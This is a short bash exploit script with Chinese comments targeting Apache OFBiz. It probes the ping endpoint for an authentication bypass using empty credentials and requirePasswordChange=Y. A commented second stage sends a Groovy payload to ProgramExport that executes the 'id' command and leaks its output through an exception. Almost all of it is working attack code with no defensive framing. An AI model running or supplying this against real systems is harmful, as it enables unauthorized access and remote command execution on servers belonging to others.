#!/usr/bin/env bash
TARGET="${1:?usage: bash ofbiz.sh http://TARGET:8443}"
B="${TARGET%/}"
# 1) 认证绕过探测（无副作用）
curl -sk -m 12 -o runs/ofbiz-ping.txt -w 'ping=%{http_code}\n' \
  "$B/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
grep -q 'PONG' runs/ofbiz-ping.txt 2>/dev/null && echo "VULN 认证绕过成立" || { echo "SAFE/未命中"; exit 1; }
# 2) Groovy 执行（利用阶段）：ProgramExport
#    curl -sk "$B/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y" \
#      --data-urlencode 'groovyProgram=throw new Exception("id".execute().text)'
#    异常信息里会带命令输出
